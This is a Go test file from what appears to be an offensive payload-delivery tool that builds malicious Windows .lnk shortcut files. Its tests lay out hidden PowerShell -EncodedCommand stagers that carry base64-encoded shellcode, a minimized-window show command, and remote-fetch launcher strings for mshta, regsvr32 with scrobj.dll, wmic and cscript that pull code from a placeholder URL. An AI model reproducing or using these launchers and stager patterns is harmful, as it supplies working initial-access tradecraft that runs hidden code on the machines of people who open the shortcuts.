package delivery

import (
	"encoding/binary"
	"testing"
	"unicode/utf16"
)

// TestLNKHeaderStructure parses back a generated .lnk and asserts the
// ShellLinkHeader fields, IDListSize, and the ARGUMENTS StringData (unicode).
// This is the internal-consistency check for the riskiest binary piece; on-target
// Windows execution remains the final verification (see README "Delivery formats >
// lnk"). Byte-exact header values mirror pylnk3's proven serialization.
func TestLNKHeaderStructure(t *testing.T) {
	args := "/c powershell -w hidden -EncodedCommand QUJD"
	data := writeShellLink("C:\\Windows\\System32\\cmd.exe", args)

	// --- ShellLinkHeader ---
	if got := binary.LittleEndian.Uint32(data[0:4]); got != 0x4C {
		t.Fatalf("HeaderSize = 0x%X, want 0x4C", got)
	}
	wantCLSID := []byte{0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}
	if string(data[4:20]) != string(wantCLSID) {
		t.Errorf("LinkCLSID = %x, want %x", data[4:20], wantCLSID)
	}
	if got := binary.LittleEndian.Uint32(data[20:24]); got != 0xA1 {
		t.Errorf("LinkFlags = 0x%X, want 0xA1 (HasIDList|HasArguments|IsUnicode)", got)
	}
	if got := binary.LittleEndian.Uint32(data[60:64]); got != 7 {
		t.Errorf("ShowCommand = %d, want 7 (SW_SHOWMINNOACTIVE)", got)
	}
	if h := binary.LittleEndian.Uint16(data[64:66]); h != 0 {
		t.Errorf("HotKey = 0x%X, want 0", h)
	}
	for i := 66; i < 76; i++ {
		if data[i] != 0 {
			t.Errorf("reserved byte %d = 0x%02X, want 0", i, data[i])
		}
	}

	// --- LinkTargetIDList ---
	off := 76
	idListSize := binary.LittleEndian.Uint16(data[off : off+2])
	off += 2
	// First item cb = RootEntry (18 bytes) + 2 = 20 = 0x14.
	if cb := binary.LittleEndian.Uint16(data[off : off+2]); cb != 0x14 {
		t.Errorf("first ITEMID cb = %d, want 20", cb)
	}
	if data[off+2] != 0x1F || data[off+3] != 0x50 {
		t.Errorf("RootEntry magic = %02X%02X, want 1F50", data[off+2], data[off+3])
	}
	off += int(idListSize)

	// --- StringData: ARGUMENTS (the only section with a flag set) ---
	cch := binary.LittleEndian.Uint16(data[off : off+2])
	off += 2
	got := string(utf16.Decode(utf16leBytes(data[off : off+int(cch)*2])))
	if got != args {
		t.Errorf("ARGUMENTS = %q, want %q", got, args)
	}
	off += int(cch) * 2

	// --- ExtraData terminator ---
	if string(data[off:off+4]) != "\x00\x00\x00\x00" {
		t.Errorf("ExtraData terminator = %x, want 00000000", data[off:off+4])
	}
	if off+4 != len(data) {
		t.Errorf("trailing bytes: parsed %d of %d", off+4, len(data))
	}
}

// utf16leBytes converts a []byte of UTF-16LE code units into the []uint16 form
// utf16.Decode expects.
func utf16leBytes(b []byte) []uint16 {
	out := make([]uint16, len(b)/2)
	for i := range out {
		out[i] = binary.LittleEndian.Uint16(b[i*2 : i*2+2])
	}
	return out
}

// TestLnkTargetInlineRemote asserts the (target, args) mapping per mode/launcher
// and that every target path is 8.3-clean (every component name fits the 8.3
// short-name scheme), which is what keeps the IDList BEEF0004 block well-formed.
func TestLnkTargetInlineRemote(t *testing.T) {
	sc := []byte{0xCC, 0xDD, 0xEE, 0xFF}

	// inline: cmd.exe wraps the powershell stager.
	tgt, args, err := lnkTarget(&Spec{Format: "lnk", Shellcode: sc})
	if err != nil {
		t.Fatal(err)
	}
	if tgt != "C:\\Windows\\System32\\cmd.exe" {
		t.Errorf("inline target = %q, want cmd.exe", tgt)
	}
	if !contains(args, "powershell") || !contains(args, "-EncodedCommand") {
		t.Errorf("inline args = %q, want a powershell -EncodedCommand stager", args)
	}
	assert83Clean(t, tgt)

	// remote per launcher.
	cases := []struct {
		launcher   string
		wantTarget  string
		argsSubstr string
	}{
		{"mshta", "C:\\Windows\\System32\\mshta.exe", "http://x/a"},
		{"regsvr32", "C:\\Windows\\System32\\regsvr32.exe", "/s /u /i:http://x/a scrobj.dll"},
		{"wmic", "C:\\Windows\\System32\\wbem\\wmic.exe", "format:\"http://x/a\""},
		{"cscript", "C:\\Windows\\System32\\cscript.exe", "//nologo http://x/a"},
		{"powershell", "C:\\Windows\\System32\\cmd.exe", "powershell"},
		{"cmd", "C:\\Windows\\System32\\cmd.exe", "powershell"},
	}
	for _, c := range cases {
		tgt, args, err := lnkTarget(&Spec{Format: "lnk", URL: "http://x/a", Launcher: c.launcher})
		if err != nil {
			t.Fatalf("%s: %v", c.launcher, err)
		}
		if tgt != c.wantTarget {
			t.Errorf("%s target = %q, want %q", c.launcher, tgt, c.wantTarget)
		}
		if !contains(args, c.argsSubstr) {
			t.Errorf("%s args = %q, want it to contain %q", c.launcher, args, c.argsSubstr)
		}
		assert83Clean(t, tgt)
	}

	// neither inline nor remote -> error.
	if _, _, err := lnkTarget(&Spec{Format: "lnk"}); err == nil {
		t.Error("expected error when neither shellcode nor url is set")
	}
}

// TestLnkEmitterEmitsArtifact exercises the full emitter (via Emit, writing to a
// temp dir) for inline + remote, and confirms raw shellcode is NOT present in the
// args (it is base64-encoded inside the powershell stager).
func TestLnkEmitterEmitsArtifact(t *testing.T) {
	sc := []byte{0xDE, 0xAD, 0xBE, 0xEF}
	dir := t.TempDir()
	arts, err := (&lnkEmitter{}).Emit(&Spec{Format: "lnk", Shellcode: sc, OutDir: dir})
	if err != nil {
		t.Fatal(err)
	}
	if len(arts) != 1 || arts[0].Path != "payload.lnk" {
		t.Fatalf("got %+v", arts)
	}
	if len(arts[0].Bytes) < 80 || arts[0].Bytes[0] != 0x4C {
		t.Errorf("not a .lnk: %d bytes, first=0x%02X", len(arts[0].Bytes), arts[0].Bytes[0])
	}
	if contains(string(arts[0].Bytes), "\xDE\xAD\xBE\xEF") {
		t.Error("raw shellcode leaked into .lnk (should be base64-encoded in the stager)")
	}
}

// assert83Clean verifies every path component name fits the 8.3 short-name scheme
// (name ≤ 8 chars, extension ≤ 3), which is the constraint lnkTarget enforces so
// short_name == full_name and the BEEF0004 block size formula is exact.
func assert83Clean(t *testing.T, path string) {
	t.Helper()
	drive, comps := splitTargetPath(path)
	if drive == "" {
		t.Errorf("%q: no drive", path)
	}
	for _, c := range comps {
		name, ext := split83(c)
		if len(name) > 8 || len(ext) > 3 {
			t.Errorf("%q: component %q not 8.3-clean (name=%d ext=%d)", path, c, len(name), len(ext))
		}
	}
}

func split83(name string) (string, string) {
	for i := len(name) - 1; i >= 0; i-- {
		if name[i] == '.' {
			return name[:i], name[i+1:]
		}
	}
	return name, ""
}

func contains(s, sub string) bool { return len(s) >= len(sub) && indexOf(s, sub) >= 0 }

func indexOf(s, sub string) int {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return i
		}
	}
	return -1
}